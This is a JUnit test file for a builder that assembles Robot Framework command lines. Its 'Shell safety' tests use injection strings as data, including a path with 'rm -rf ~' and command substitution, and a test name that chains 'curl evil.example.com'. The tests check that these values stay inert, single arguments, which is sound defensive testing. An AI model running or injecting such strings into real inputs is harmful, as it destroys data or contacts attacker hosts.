/*
 * Copyright (c) 2026 Jakub Jirák.
 * Licensed under the Apache License, Version 2.0. See LICENSE for details.
 */
package com.jakubjirak.robotframework.execution;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

@DisplayName("RobotCommandBuilder")
class RobotCommandBuilderTest {

    private List<String> build(RobotCommandBuilder.Params params) {
        return RobotCommandBuilder.build(params);
    }

    private RobotCommandBuilder.Params suite(String path) {
        return new RobotCommandBuilder.Params().interpreterPath("/usr/bin/python3").suitePath(path);
    }

    @Nested
    @DisplayName("Command shape")
    class ShapeTests {
        @Test
        @DisplayName("runs the suite through the interpreter's robot module")
        void minimal() {
            assertEquals(
                    List.of("/usr/bin/python3", "-m", "robot", "--consolecolors", "ansi", "tests/suite.robot"),
                    build(suite("tests/suite.robot")));
        }

        @Test
        @DisplayName("falls back to a default interpreter")
        void defaultInterpreter() {
            List<String> command = build(new RobotCommandBuilder.Params().suitePath("s.robot"));
            assertEquals(RobotCommandBuilder.DEFAULT_INTERPRETER, command.get(0));
        }

        @Test
        @DisplayName("the suite path is always the last argument")
        void suiteLast() {
            List<String> command = build(suite("s.robot")
                    .testName("Login")
                    .includeTags("smoke")
                    .extraArguments("--dryrun"));
            assertEquals("s.robot", command.get(command.size() - 1));
        }

        @Test
        @DisplayName("an empty suite path produces no trailing argument")
        void noSuite() {
            List<String> command = build(new RobotCommandBuilder.Params().interpreterPath("python3"));
            assertEquals(List.of("python3", "-m", "robot", "--consolecolors", "ansi"), command);
        }
    }

    @Nested
    @DisplayName("Options")
    class OptionTests {
        @Test
        @DisplayName("test name becomes --test")
        void testName() {
            List<String> command = build(suite("s.robot").testName("User Can Log In"));
            int index = command.indexOf("--test");
            assertTrue(index > 0);
            assertEquals("User Can Log In", command.get(index + 1));
        }

        @Test
        @DisplayName("tags are split on commas and whitespace")
        void tags() {
            List<String> command = build(suite("s.robot").includeTags("smoke, login regression"));
            assertEquals(3, command.stream().filter("--include"::equals).count());
            assertTrue(command.containsAll(List.of("smoke", "login", "regression")));
        }

        @Test
        @DisplayName("exclude tags use --exclude")
        void excludeTags() {
            List<String> command = build(suite("s.robot").excludeTags("slow"));
            int index = command.indexOf("--exclude");
            assertTrue(index > 0);
            assertEquals("slow", command.get(index + 1));
        }

        @Test
        @DisplayName("output directory becomes --outputdir")
        void outputDirectory() {
            List<String> command = build(suite("s.robot").outputDirectory("build/robot"));
            int index = command.indexOf("--outputdir");
            assertTrue(index > 0);
            assertEquals("build/robot", command.get(index + 1));
        }

        @Test
        @DisplayName("the debug flag adds --loglevel DEBUG")
        void debugLogLevel() {
            List<String> command = build(suite("s.robot").debugLogLevel(true));
            int index = command.indexOf("--loglevel");
            assertTrue(index > 0);
            assertEquals("DEBUG", command.get(index + 1));
        }

        @Test
        @DisplayName("empty options are omitted entirely")
        void emptyOptions() {
            List<String> command = build(suite("s.robot")
                    .testName("  ")
                    .includeTags("")
                    .excludeTags(null)
                    .outputDirectory("")
                    .extraArguments("   "));
            assertFalse(command.contains("--test"));
            assertFalse(command.contains("--include"));
            assertFalse(command.contains("--exclude"));
            assertFalse(command.contains("--outputdir"));
        }
    }

    @Nested
    @DisplayName("Argument splitting")
    class SplittingTests {
        @Test
        @DisplayName("plain arguments split on whitespace")
        void plain() {
            assertEquals(List.of("--dryrun", "--nostatusrc"),
                    RobotCommandBuilder.splitArguments("--dryrun  --nostatusrc"));
        }

        @Test
        @DisplayName("quoted arguments stay together")
        void quoted() {
            assertEquals(List.of("--variable", "NAME:two words"),
                    RobotCommandBuilder.splitArguments("--variable \"NAME:two words\""));
            assertEquals(List.of("--variable", "NAME:two words"),
                    RobotCommandBuilder.splitArguments("--variable 'NAME:two words'"));
        }

        @Test
        @DisplayName("an unterminated quote still yields the word")
        void unterminatedQuote() {
            assertEquals(List.of("--name", "abc"), RobotCommandBuilder.splitArguments("--name \"abc"));
        }

        @Test
        @DisplayName("empty input yields no arguments")
        void empty() {
            assertEquals(List.of(), RobotCommandBuilder.splitArguments("   "));
        }
    }

    @Nested
    @DisplayName("Shell safety")
    class SafetyTests {
        @Test
        @DisplayName("shell metacharacters in a path stay one argument")
        void metacharactersInPath() {
            String nasty = "/tmp/a b; rm -rf ~/`whoami`$(id).robot";
            List<String> command = build(suite(nasty));
            assertEquals(nasty, command.get(command.size() - 1));
            assertEquals(1, command.stream().filter(nasty::equals).count());
        }

        @Test
        @DisplayName("shell metacharacters in a test name stay one argument")
        void metacharactersInTestName() {
            String nasty = "Login && curl evil.example.com";
            List<String> command = build(suite("s.robot").testName(nasty));
            assertEquals(nasty, command.get(command.indexOf("--test") + 1));
        }

        @Test
        @DisplayName("the command is never assembled into a shell string")
        void noShellString() {
            List<String> command = build(suite("s.robot").extraArguments("--dryrun"));
            for (String argument : command) {
                assertFalse(argument.contains("&&"), "unexpected shell operator in " + argument);
                assertFalse(argument.contains("|"), "unexpected pipe in " + argument);
            }
        }
    }
}
